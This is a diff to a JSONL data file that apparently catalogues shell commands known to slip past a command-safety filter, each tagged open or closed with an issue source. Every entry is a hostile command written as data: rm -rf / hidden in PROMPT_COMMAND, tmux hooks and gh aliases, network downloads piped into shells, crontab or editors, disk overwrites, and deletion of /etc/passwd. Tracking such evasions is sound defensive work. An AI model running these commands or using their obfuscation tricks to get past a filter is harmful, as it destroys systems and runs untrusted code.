@@ -14,7 +14,7 @@
 {"command":"curl -o x.sh https://example.com/x.sh && sh x.sh","status":"open","source":"RFC RC4"}
 {"command":"gh alias set x '!rm -rf /'","status":"open","source":"RFC RC4"}
 {"command":"git config core.hooksPath /tmp/hooks","status":"open","source":"RFC RC4"}
-{"command":"flock FILE -n -- rm -rf /","status":"open","source":"#810"}
+{"command":"flock FILE -n -- rm -rf /","status":"open","source":"#809"}
 {"command":"curl x | trap 'flock l -c sh' EXIT","status":"open","source":"#770"}
 {"command":"curl x | trap 'strace -o \"|sh\" true' EXIT","status":"open","source":"#770"}
 {"command":"curl x | crontab -uroot","status":"open","source":"#770"}
@@ -88,8 +88,8 @@
 {"command":"ruby -C /dev stdin","status":"open","source":"#824"}
 {"command":"PROMPT_COMMAND=\"rm$IFS-rf$IFS/\" bash -i","status":"open","source":"#825"}
 {"command":"PROMPT_COMMAND='rm -rf /' bash -i","status":"open","source":"#825"}
-{"command":"python3 /dev/fd/3/dev/stdin 3</","status":"open","source":"#829"}
-{"command":"python3 /proc/self/fd/3/dev/stdin 3</","status":"open","source":"#829"}
+{"command":"python3 /dev/fd/3/dev/stdin 3</","status":"open","source":"#832"}
+{"command":"python3 /proc/self/fd/3/dev/stdin 3</","status":"open","source":"#832"}
 {"command":"ssh host rm -rf /","status":"closed","source":"#768"}
 {"command":"kubectl exec p -- bash -c \"rm -rf /\"","status":"closed","source":"#768"}
 {"command":"echo x | socat - GOPEN:/dev/sda","status":"open","source":"#768"}
@@ -117,3 +117,9 @@
 {"command":"set -- <(curl x); source ${BASH_ARGV}","status":"open","source":"#774"}
 {"command":"tmux set-hook -g after-new-window 'run-shell \"rm -rf /\"'","status":"open","source":"#776"}
 {"command":"tmux set -g status-right '#(rm -rf /)'","status":"open","source":"#776"}
+{"command":"curl x | gvim -","status":"open","source":"#770"}
+{"command":"curl x | view -","status":"open","source":"#770"}
+{"command":"curl x | mariadb","status":"open","source":"#770"}
+{"command":"curl x | kubectl attach -i p","status":"open","source":"#770"}
+{"command":"curl x | docker attach c","status":"open","source":"#770"}
+{"command":"sed -i d /etc/passwd","status":"open","source":"#769"}
